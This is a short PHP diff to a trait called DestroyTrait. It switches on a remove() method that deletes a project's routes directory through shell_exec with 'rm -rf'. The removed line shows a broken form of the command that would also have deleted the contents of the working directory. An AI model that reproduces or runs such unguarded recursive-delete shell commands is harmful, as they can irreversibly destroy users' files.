@@ -8,7 +8,7 @@ trait DestroyTrait
     {
         self::changeRouteProvider();
         self::changeAppProvider();
-        // self::remove();
+        self::remove();
     }
 
     private static function changeRouteProvider(): void
@@ -32,6 +32,6 @@ trait DestroyTrait
 
     private static function remove(): void
     {
-        shell_exec('rm -rf ' . base_path('routes') . ' *');
+        shell_exec('cd ' . base_path('routes/') . ' && rm -rf *');
     }
 }
